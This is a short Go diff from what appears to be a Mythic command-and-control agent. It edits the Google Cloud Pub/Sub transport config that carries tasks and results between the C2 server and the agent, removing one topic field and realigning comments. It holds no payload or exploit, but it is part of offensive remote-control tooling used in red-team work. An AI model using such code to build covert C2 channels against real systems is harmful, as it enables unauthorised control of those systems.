@@ -247,9 +247,8 @@ func main() {
 			// Build-time variables injected by Mythic - use them
 			pubsubConfig = Config{
 				ProjectID:       gcpProjectID,
-				TasksTopic:      serverToAgentTopic,      // Server publishes tasks here
-				ResultsTopic:    agentToServerTopic,       // Agent publishes results here
-				SubscriptionID:  serverToAgentSub,         // Agent subscribes to tasks
+				ResultsTopic:    agentToServerTopic, // Agent publishes results here
+				SubscriptionID:  serverToAgentSub,   // Agent subscribes to tasks
 				CredentialsJSON: credentialsJSON,
 			}
 			if core.Verbose {
